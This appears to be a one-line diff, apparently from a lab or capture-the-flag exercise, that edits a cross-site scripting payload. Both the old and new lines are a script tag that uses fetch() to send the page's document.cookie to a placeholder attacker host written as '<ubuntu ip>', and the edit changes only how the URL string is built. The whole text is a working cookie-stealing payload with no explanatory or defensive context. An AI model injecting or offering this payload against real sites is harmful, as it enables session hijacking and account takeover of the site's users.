@@ -1,1 +1,1 @@
-<script>fetch('http://<ubuntu>/'+document.cookie)</script>
+<script>fetch(`http://<ubuntu ip>/${document.cookie}`)</script>
